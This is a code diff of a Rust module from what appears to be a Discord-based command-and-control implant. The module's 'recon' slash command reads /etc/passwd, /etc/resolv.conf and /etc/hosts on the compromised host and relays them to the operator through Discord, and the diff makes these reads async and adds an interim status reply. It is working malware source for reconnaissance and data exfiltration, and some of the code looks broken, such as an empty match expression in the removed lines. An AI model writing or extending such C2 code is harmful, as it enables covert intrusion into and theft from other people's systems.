@@ -24,13 +24,13 @@ use serenity::{
 use anyhow::Error;
 use chrono::Utc;
 use lazy_static::lazy_static;
+use serenity::futures::TryFutureExt;
 use serenity::model::application::interaction::InteractionResponseType;
 use serenity::model::channel::AttachmentType;
 use tokio::sync::Mutex;
 use tracing::{info as informational, warn, error};
 use crate::os::recon_utils::{get_etc_hosts, get_etc_passwd, get_resolv_conf};
 
-#[cfg(target_os = "linux")]
 pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicationCommand {
     // Register the recon command
     command
@@ -58,23 +58,31 @@ pub async fn run(options: &[CommandDataOption]) -> Result<String, DiscordC2Error
         .as_ref()
         .ok_or(DiscordC2Error::InternalError("Expected valid recon operation".to_string()))?;
 
-    match  {
-        "Read /etc/passwd" => {
-            Ok(get_etc_passwd())
-        },
-        "Read /etc/resolv.conf" => {
-            Ok(get_resolv_conf())
-        },
-        "Read /etc/hosts" => {
-            Ok(get_etc_hosts().to_string())
-        },
-        _ => {
-            Err(DiscordC2Error::InvalidInput("Invalid recon operation.".to_string()))
+    if let CommandDataOptionValue::String(operation) = operation {
+        match operation.as_str() {
+            "Read /etc/passwd" => {
+                Ok(get_etc_passwd().await)
+            }
+            "Read /etc/resolv.conf" => {
+                Ok(get_resolv_conf().await)
+            }
+            "Read /etc/hosts" => {
+                Ok(get_etc_hosts().await)
+            }
+            _ => {
+                Err(DiscordC2Error::InvalidInput("Invalid recon operation.".to_string()))
+            }
         }
+    } else {
+        Err(DiscordC2Error::InvalidInput("Invalid recon operation.".to_string()))
     }
 }
 
 pub async fn recon_handler(ctx: &Context, command: &ApplicationCommandInteraction) -> Result<(), DiscordC2Error> {
+    let response = send_interaction_response(
+        ctx,
+        command,
+        "Executing operation...").await?;
     let operation = run(&command.data.options).await;
 
     command.create_interaction_response(&ctx.http, |response| {
@@ -91,4 +99,26 @@ pub async fn recon_handler(ctx: &Context, command: &ApplicationCommandInteractio
     }).await?;
 
     Ok(())
+}
+
+async fn send_interaction_response<'a, T>(
+    ctx: &'a Context,
+    command: &'a ApplicationCommandInteraction,
+    content: T,
+) -> Result<ApplicationCommandInteraction, DiscordC2Error>
+    where
+        T: AsRef<str> + 'a,
+{
+    command
+        .create_interaction_response(&ctx.http, |response| {
+            response
+                .kind(InteractionResponseType::ChannelMessageWithSource)
+                .interaction_response_data(|message| {
+                    message.content(content.as_ref());
+
+                    message
+                })
+        })
+        .await?;
+    Ok(command.to_owned())
 }
